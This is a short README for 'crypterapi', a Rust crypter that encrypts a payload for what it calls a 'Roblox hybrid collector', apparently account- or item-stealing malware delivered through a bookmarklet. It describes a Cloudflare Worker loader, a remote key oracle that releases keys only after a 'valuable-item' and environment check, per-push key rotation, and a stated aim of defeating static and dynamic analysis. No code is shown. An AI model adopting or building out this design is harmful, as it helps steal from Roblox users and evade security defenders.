# crypterapi

High-security DOM loader crypter for the Roblox hybrid collector.

- Pure Rust crypter
- Unique 256-bit runtime key generated on every patch
- AES-256-GCM encrypted payload
- Cloudflare Worker loader + remote key oracle (webhook)
- Client-side final decryption only after valuable-item / environment check
- Designed to make static and dynamic analysis extremely difficult

## Architecture

1. `crypter/` – Rust binary that takes plaintext payload → outputs encrypted blob + key material
2. `worker/` – Cloudflare Worker that serves the multi-stage loader
3. Webhook / key oracle – only releases decryption material after context validation (valuable items detection, page fingerprint, etc.)
4. Bookmarklet stays tiny and constant

## Build Flow

Every push to main:
- Rust crypter runs
- New random key is generated
- Payload is encrypted
- Worker is updated with new ciphertext

